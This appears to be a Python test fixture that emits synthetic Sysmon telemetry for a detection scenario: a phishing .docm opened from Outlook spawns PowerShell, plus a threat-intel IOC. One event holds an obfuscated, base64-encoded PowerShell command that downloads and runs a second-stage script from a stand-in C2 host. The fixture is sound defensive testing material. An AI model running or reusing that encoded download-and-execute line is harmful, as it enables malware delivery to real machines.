"""
Acceptance Scenario 1: Phishing Attachment Leading to PowerShell Execution
Emits malicious outlook attachment launch, obfuscated PowerShell execution, and C2 download.
"""

import time
from typing import Dict, Any, List


def get_scenario_1_events() -> List[Dict[str, Any]]:
    """Return raw event telemetry for Scenario 1."""
    now = time.time()
    return [
        {
            "source": "sysmon",
            "event_type": "Process Creation",
            "event_id": 1,
            "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
            "process_id": 4120,
            "command_line": "OUTLOOK.EXE /select invoice_payload.docm",
            "timestamp": now - 300,
        },
        {
            "source": "sysmon",
            "event_type": "Process Creation",
            "event_id": 1,
            "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "process_id": 5890,
            "parent_process_id": 4120,
            "command_line": "WINWORD.EXE C:\\Users\\victim\\Downloads\\invoice_payload.docm",
            "timestamp": now - 280,
        },
        {
            "source": "sysmon",
            "event_type": "Process Creation",
            "event_id": 1,
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "process_id": 6112,
            "parent_process_id": 5890,
            "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand aW52b2tlLWV4cHJlc3Npb24gKG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHA6Ly9ldmlsLWMyLmNvbS9zdGFnZTIucHMxJyk=",
            "timestamp": now - 260,
        },
        {
            "source": "threat_intel",
            "ioc": "evil-c2.com",
            "ioc_type": "domain",
            "threat_name": "APT29 Phishing C2 Domain",
            "severity": "CRITICAL",
            "risk_score": 95.0,
            "timestamp": now - 250,
        },
    ]
